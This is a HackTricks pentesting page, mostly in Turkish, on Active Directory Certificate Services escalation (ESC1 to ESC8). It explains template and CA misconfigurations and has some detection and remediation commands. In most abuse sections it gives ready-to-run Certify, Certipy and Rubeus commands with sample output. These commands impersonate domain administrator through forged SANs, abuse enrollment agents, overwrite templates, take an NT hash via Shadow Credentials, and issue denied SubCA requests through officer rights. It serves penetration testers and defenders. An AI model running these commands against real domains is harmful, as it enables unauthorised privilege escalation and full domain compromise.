# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Bu, aşağıdaki yazıların yükseltme teknikleri bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment hakları Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara veriliyor.**
- **Yönetici onayı gerekli değil.**
- **Yetkili personelin imzaları gerekmiyor.**
- **Sertifika şablonları üzerindeki security descriptor'lar aşırı izin verici; bu da düşük ayrıcalıklı kullanıcıların enrolment hakları elde etmesine izin veriyor.**
- **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Genişletilmiş Anahtar Kullanımı (Extended Key Usage, EKU) tanımlayıcıları olarak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU yok (SubCA) gibi seçenekler dahil edilebilir.
- **Şablon, istemcinin Certificate Signing Request (CSR) içinde subjectAltName (SAN) eklemesine izin veriyor:**
- Active Directory (AD), bir sertifikada subjectAltName (SAN) varsa kimlik doğrulama için SAN'ı önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcıyı (ör. domain administrator) taklit edecek şekilde sertifika talep edilebileceği anlamına gelir. İstemcinin bir SAN belirtip belirtemeyeceği, sertifika şablonunun AD nesnesindeki `mspki-certificate-name-flag` özelliğiyle belirtilir. Bu özellik bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin varlığı, istemcinin SAN belirtmesine izin verir.

> [!CAUTION]
> Yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine olanak tanır; bu da Kerberos veya SChannel üzerinden herhangi bir domain principal olarak kimlik doğrulamasına imkan verir.

Bu özellik bazen ürünlerin veya dağıtım servislerinin HTTPS veya host sertifikalarını anlık olarak üretmesini desteklemek için ya da eksik bilgi nedeniyle etkinleştirilir.

Bu seçenekle bir sertifika oluşturmanın bir uyarı tetiklediği, oysa mevcut bir sertifika şablonu (ör. `WebServer` şablonu, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin) kopyalanıp ardından bir authentication OID'si eklenerek değiştirildiğinde bu uyarının oluşmadığı not edilmiştir.

### Abuse

Zayıf sertifika şablonlarını **bulmak** için şu komutu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Bu **zafiyeti kötüye kullanarak bir yöneticiyi taklit etmek** için şunu çalıştırabilirsiniz:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Daha sonra oluşturulan **sertifikayı `.pfx` formatına** dönüştürebilir ve bunu **Rubeus veya certipy kullanarak kimlik doğrulaması yapmak** için tekrar kullanabilirsiniz:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe" PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olanların listelenmesi, aşağıdaki LDAP sorgusu çalıştırılarak yapılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci suistimal senaryosu birincinin bir varyasyonudur:

1. Enrollment hakları Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Yönetici onayı gereksinimi devre dışı bırakılır.
3. Yetkili imza zorunluluğu atlanır.
4. Sertifika şablonunda aşırı izinli bir security descriptor, sertifika enrollment haklarını düşük ayrıcalıklı kullanıcılara verir.
5. **Sertifika şablonu Any Purpose EKU veya no EKU içerir şekilde tanımlanmıştır.**

**Any Purpose EKU**, bir saldırıcının istemci kimlik doğrulaması, sunucu kimlik doğrulaması, kod imzalama vb. dahil olmak üzere **herhangi bir amaç** için sertifika elde etmesine izin verir. Bu senaryoyu istismar etmek için **ESC3**'te kullanılan aynı teknik kullanılabilir.

No EKUs içeren sertifikalar, subordinate CA sertifikaları olarak davranır, **herhangi bir amaç** için kötüye kullanılabilir ve **yeni sertifikaları imzalamak** için de kullanılabilir. Bu nedenle bir saldırgan, subordinate CA sertifikasını kullanarak yeni sertifikalarda rastgele EKU veya alanlar belirleyebilir.

Ancak, subordinate CA `NTAuthCertificates` nesnesi tarafından güvenilmiyorsa (varsayılan ayar), **domain authentication** için oluşturulan yeni sertifikalar çalışmaz. Yine de, bir saldırgan herhangi bir EKU ve rastgele sertifika değerleri ile **yeni sertifikalar** oluşturabilir. Bunlar kod imzalama, sunucu kimlik doğrulama vb. gibi çeşitli amaçlar için kötüye kullanılabilir ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçlara yol açabilir.

AD Forest’in yapılandırma şemasında bu senaryoya uyan şablonları listelemek için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Açıklama

Bu senaryo birinci ve ikinci ile benzerdir ancak **farklı bir EKU'yu** (Certificate Request Agent) ve **2 farklı şablonu** **abuse** eder (bu nedenle iki ayrı gereksinim seti vardır),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft belgelerinde **Enrollment Agent** olarak bilinir, bir principalin **başka bir kullanıcı adına** **sertifika** için **enroll** olmasına izin verir.

“enrollment agent” böyle bir şablona enroll olur ve ortaya çıkan sertifikayı diğer kullanıcı adına bir CSR'yi birlikte imzalamak (co-sign) için kullanır. Ardından ortak imzalanmış CSR'yi CA'ya gönderir, “başkası adına kayıt” (enroll on behalf of) izni veren bir şablona enroll olur ve CA “diğer” kullanıcıya ait bir sertifika ile yanıt verir.

**Gereksinimler 1:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Yönetici onayı gerekliliği atlanmıştır.
- Yetkili imzalar için herhangi bir gereklilik yoktur.
- Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin verir şekilde yapılandırılmıştır; düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Sertifika şablonu Certificate Request Agent EKU'sunu içerir; bu, diğer principal'ler adına diğer sertifika şablonlarının talep edilmesine olanak sağlar.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Yönetici onayı atlanır.
- Şablonun şema sürümü ya 1'dir ya da 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Sertifika şablonunda tanımlı bir EKU, domain authentication'a izin verir.
- Enrollment agent'lar için kısıtlamalar CA üzerinde uygulanmamıştır.

### Abuse

Bu senaryoyu abuse etmek için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## Zayıf Sertifika Şablonu Erişim Denetimi - ESC4

### **Açıklama**

**Sertifika şablonları** üzerindeki **security descriptor**, şablonla ilgili hangi **AD principals**in hangi **permissions**e sahip olduğunu tanımlar.

Eğer bir **attacker**, bir **şablonu** **değiştirmek** ve önceki bölümlerde belirtilen herhangi bir **sömürülebilir yanlış yapılandırmayı** uygulamak için gerekli **permissions**a sahip olursa, ayrıcalık yükseltme mümkün hale gelebilir.

Sertifika şablonlarına uygulanabilen dikkat çekici izinler şunlardır:

- **Owner:** Nesne üzerinde dolaylı kontrol sağlar; herhangi bir özniteliği değiştirmeye izin verir.
- **FullControl:** Nesne üzerinde tam yetki verir; herhangi bir özniteliği değiştirme yeteneğini içerir.
- **WriteOwner:** Nesnenin sahibini attacker kontrolündeki bir principal olarak değiştirmeye izin verir.
- **WriteDacl:** Erişim denetimlerini ayarlamaya izin verir; potansiyel olarak attacker'a FullControl verebilir.
- **WriteProperty:** Herhangi bir nesne özelliğinin düzenlenmesine yetki verir.

### Kötüye Kullanım

Şablonlar ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip principal'leri tespit etmek için Certify ile listeleyin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Öncekine benzer bir privesc örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir sertifika şablonu üzerinde yazma ayrıcalıklarına sahip olduğu durumdur. Bu, örneğin şablonun yapılandırmasını üzerine yazarak şablonu ESC1'e karşı savunmasız hâle getirmek için suistimal edilebilir.

Yukarıdaki yolda gördüğümüz gibi, yalnızca `JOHNPC` bu ayrıcalıklara sahip, ancak kullanıcı `JOHN`'in `JOHNPC`'ye yeni bir `AddKeyCredentialLink` kenarı var. Bu teknik sertifikalarla ilgili olduğundan, bu saldırıyı da uyguladım; bu yöntem [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinir. İşte kurbanın NT hash'ini almak için Certipy’s `shadow auto` komutunun küçük bir önizlemesi.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** sertifika şablonunun yapılandırmasını tek bir komutla üzerine yazabilir. By **varsayılan**, Certipy yapılandırmayı **üzerine yazacak** şekilde değiştirir ve bunu **ESC1'e karşı savunmasız** hale getirir. Ayrıca **eski yapılandırmayı kaydetmek için `-save-old` parametresini** belirtebiliriz; bu, saldırımızdan sonra yapılandırmayı **geri yüklemek** için kullanışlı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zayıf PKI Nesne Erişim Kontrolü - ESC5

### Açıklama

Sertifika şablonları ve certification authority dışında kalan birkaç nesneyi de içeren, ACL tabanlı geniş ve birbirine bağlı ilişkiler ağı tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunları kapsar:

- CA sunucusunun AD bilgisayar nesnesi; S4U2Self veya S4U2Proxy gibi mekanizmalarla ele geçirilebilir.
- CA sunucusunun RPC/DCOM sunucusu.
- Belirli konteyner yolu `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` içindeki herhangi bir alt düzey AD nesnesi veya konteyner. Bu yol, ancak bunlarla sınırlı olmamak üzere Certificate Templates container, Certification Authorities container, NTAuthCertificates object ve Enrollment Services Container gibi konteyner ve nesneleri içerir.

Düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden birinin kontrolünü ele geçirirse PKI sisteminin güvenliği tehlikeye girebilir.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) içinde ele alınan konu aynı zamanda Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerine de değinir. Bu yapılandırma bir Certification Authority (CA) üzerinde etkinleştirildiğinde, Active Directory®'den oluşturulanlar da dahil olmak üzere **herhangi bir istek** için **subject alternative name** içine **kullanıcı tanımlı değerlerin** eklenmesine izin verir. Sonuç olarak, bu düzenleme bir **saldırganın** alan **authentication** için ayarlanmış herhangi bir **template** üzerinden—özellikle standart User template gibi ayrıcalıksız kullanıcı kayıtlarına açık olanlardan—kayıt olmasına imkan tanır. Böylelikle bir sertifika edinilerek saldırgan domain yöneticisi veya etki alanındaki **herhangi bir diğer aktif varlık** olarak kimlik doğrulaması yapabilir.

**Not**: `-attrib "SAN:"` argümanı ile `certreq.exe` içinde Name Value Pairs olarak anılan şekilde bir Certificate Signing Request (CSR) içine alternatif adlar ekleme yöntemi, ESC1'deki SAN'ların kötüye kullanımı stratejisinden bir **fark** gösterir. Buradaki ayırıcı nokta, hesap bilgilerinin nasıl kapsüllediğidir—bir uzantı yerine sertifika özniteliği içinde.

### Kötüye Kullanım

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **remote registry access** kullanır, dolayısıyla alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edebilir ve sömürebilir:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, birinin **etki alanı yönetici hakları** veya eşdeğerine sahip olduğu varsayıldığında, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için bayrak şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> May 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar** bir **güvenlik uzantısı** içerecek ve bu uzantı **istek sahibinin `objectSid` özelliğini** barındıracaktır. ESC1 için bu SID belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN yerine **istek sahibinin `objectSid`** değerini yansıtır.\
> ESC6'yı kullanabilmek için, sistemin ESC10 (Weak Certificate Mappings) zafiyetine açık olması gerekir; bu zafiyet **yeni güvenlik uzantısı yerine SAN'ı önceliklendirir**.

## Zayıf Sertifika Yetkilisi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika yetkilisi için erişim kontrolü, CA işlemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler `certsrv.msc`'ye erişip bir CA'ya sağ tıklayarak, Properties'i seçip Security sekmesine gidilerek görülebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu tür komutlarla enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Kötüye Kullanım

Bir certificate authority üzerinde **`ManageCA`** haklarına sahip olmak, ilgili hesabın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak sağlar. Bu, herhangi bir şablonda SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını açıp kapamak gibi işlemleri içerir; bu, domain escalation için kritik bir konudur.

Bu süreç PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’inin kullanılmasıyla basitleştirilebilir; bu sayede doğrudan GUI ile etkileşime girmeden değişiklik yapılabilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen talepleri onaylamayı kolaylaştırır ve böylece “CA certificate manager approval” korumasını fiilen baypas eder.

Bir sertifika istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> Önceki saldırıda **`Manage CA`** izinleri **EDITF_ATTRIBUTESUBJECTALTNAME2** bayrağını etkinleştirmek için kullanıldı ve **ESC6 attack** gerçekleştirilmek istendi, ancak CA servisi (`CertSvc`) yeniden başlatılana kadar bunun herhangi bir etkisi olmayacaktır. Bir kullanıcı `Manage CA` erişim hakkına sahip olduğunda, kullanıcının **servisi yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının **servisi uzaktan yeniden başlatabileceği anlamına gelmez**. Ayrıca, Mayıs 2022 güvenlik güncellemeleri nedeniyle, **ESC6 kutudan çıktığı gibi çoğu yamalı ortamda çalışmayabilir**.

Bu nedenle, burada başka bir saldırı sunuluyor.

Ön koşullar:

- Sadece **`ManageCA`** izni
- **`Manage Certificates`** izni (**`ManageCA`** üzerinden verilebilir)
- Sertifika şablonu **`SubCA`** **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri oluşturabileceği** gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1'e karşı savunmasızdır**, ancak şablona kayıt yaptırabilecek olan **yalnızca yöneticilerdir**. Bu nedenle bir **kullanıcı**, **`SubCA`**'ya kayıt için **istek** gönderebilir — bu **reddedilecektir** — fakat daha sonra yönetici tarafından **verilecektir**.

#### Kötüye Kullanım

Kullanıcınızı yeni bir görevli olarak ekleyerek kendinize **`Manage Certificates`** erişim hakkını verebilirsiniz.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu `-enable-template` parametresi ile **CA üzerinde etkinleştirilebilir**. Varsayılan olarak, `SubCA` şablonu etkin durumdadır.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonuna dayalı bir sertifika talep ederek** başlayabiliriz.

**Bu istek reddedilecek**, fakat özel anahtarı kaydedeceğiz ve istek ID'sini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile `ca` komutu ve `-issue-request <request ID>` parametresiyle başarısız sertifika isteğini **verebiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresi ile **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 istismarlarına (EDITF özniteliklerini etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0** yalnızca Enterprise CA üzerinde *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren tamamen yeni bir primitive ortaya koydu.

`ICertAdmin::SetExtension` RPC yöntemi *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Yöntem geleneksel olarak meşru CA'lar tarafından **bekleyen** isteklerde uzantıları güncellemek için kullanılırken, bir saldırgan bunu bekleyen bir isteğe **varsayılan olmayan bir sertifika uzantısı** (ör. `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) **eklemek** için kötüye kullanabilir.

Hedeflenen şablon bu uzantı için **varsayılan bir değer tanımlamadığı** için, istek nihai olarak verildiğinde CA saldırgan kontrollü değeri ÜZERİNE YAZMAZ. Sonuç olarak ortaya çıkan sertifika saldırgan tarafından seçilmiş bir uzantı içerir ve bu şu riskleri doğurabilir:

* Diğer savunmasız şablonların Application / Issuance Policy gereksinimlerini karşılayarak ayrıcalık yükseltmeye yol açabilir.
* Sertifikaya ek EKU veya politikalar enjekte edilerek üçüncü taraf sistemlerde beklenmedik bir güven kazandırabilir.

Kısacası, daha önce ESC7'nin “daha az güçlü” yarısı olarak görülen *Manage Certificates*, artık CA yapılandırmasına dokunmadan veya daha kısıtlı *Manage CA* hakkını gerektirmeden tam ayrıcalık yükseltme veya uzun vadeli persistence için kullanılabilir.

#### Certify 2.0 ile primitive'ın kötüye kullanımı

1. **Beklemede (*pending*) kalacak bir sertifika isteği gönderin.** Bu, yönetici onayı gerektiren bir şablonla zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. Yeni `manage-ca` komutunu kullanarak bekleyen isteğe özel bir uzantı ekleyin:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Eğer şablon zaten *Certificate Issuance Policies* uzantısını tanımlamıyorsa, yukarıdaki değer verilme sonrası korunacaktır.*

3. İsteği verin (eğer rolünüzde *Manage Certificates* onay hakları da varsa) veya bir operatörün onaylamasını bekleyin. Verildikten sonra sertifikayı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan sertifika artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (ör. ESC13, domain yükseltmesi vb.) kullanılabilir.

> NOTE:  Aynı saldırı Certipy ≥ 4.7 ile `ca` komutu ve `-set-extension` parametresi kullanılarak da gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> AD CS'nin yüklü olduğu ortamlarda, eğer bir **web enrollment endpoint** zafiyeti mevcutsa ve en az bir **sertifika şablonu** yayımlanmışsa ve bu şablon **domain computer enrollment ve client authentication** izinlerine sahipse (varsayılan **`Machine`** şablonu gibi), spooler servisi etkin olan herhangi bir bilgisayarın bir saldırgan tarafından ele geçirilmesi mümkün hale gelir!

AD CS, yöneticilerin kurabileceği ek sunucu rolleri aracılığıyla kullanılabilen birkaç **HTTP tabanlı enrollment yöntemi** destekler. Bu HTTP tabanlı sertifika enrollment arayüzleri **NTLM relay saldırılarına** açıktır. Bir saldırgan, **ele geçirilmiş bir makinadan**, gelen NTLM ile kimlik doğrulayan herhangi bir AD hesabının kimliğine bürünebilir. Mağdur hesabın yerine geçerken, bu web arayüzlerine erişip `User` veya `Machine` sertifika şablonlarını kullanarak **client authentication sertifikası talep edebilir**.

- **web enrollment interface** (eski bir ASP uygulaması, `http://<caserver>/certsrv/` adresinde bulunur) varsayılan olarak yalnızca HTTP kullanır; bu da NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca Authorization HTTP header'ı aracılığıyla yalnızca NTLM doğrulamasına açık şekilde yapılandırılmıştır, bu da Kerberos gibi daha güvenli yöntemlerin uygulanmasını engeller.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES) varsayılan olarak Authorization HTTP header'larında negotiate doğrulamayı destekler. Negotiate doğrulaması hem Kerberos hem de **NTLM**'yi desteklediğinden, bir saldırgan relay saldırıları sırasında doğrulamayı **NTLM'ye düşürebilir**. Bu web servisleri varsayılan olarak HTTPS'yi etkinleştirse de, sadece HTTPS kullanımı **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS için NTLM relay saldırılarına karşı koruma, kanal bağlaması (channel binding) ile birleştirildiğinde mümkündür. Ne yazık ki, AD CS IIS üzerinde Extended Protection for Authentication'ı etkinleştirmez; bu da channel binding için gereklidir.

NTLM relay saldırılarında sık görülen bir **sorun**, NTLM oturumlarının **kısa süreli olması** ve saldırganın **NTLM signing** gerektiren servislerle etkileşim kuramamasıdır.

Buna rağmen, bir NTLM relay saldırısını kullanarak kullanıcı için bir sertifika edinmek bu sınırlamayı aşar; çünkü oturum süresini belirleyen sertifikanın geçerlilik süresidir ve sertifika **NTLM signing** zorunluluğu olan servislerde kullanılabilir. Çalınan bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarının bir diğer sınırlaması ise **saldırgan kontrolündeki bir makinenin mağdur hesap tarafından kimlik doğrulaması yapılmasını gerektirmesidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamayı **zorlamayı** deneyebilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` komutu **etkin HTTP AD CS uç noktalarını** listeler:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

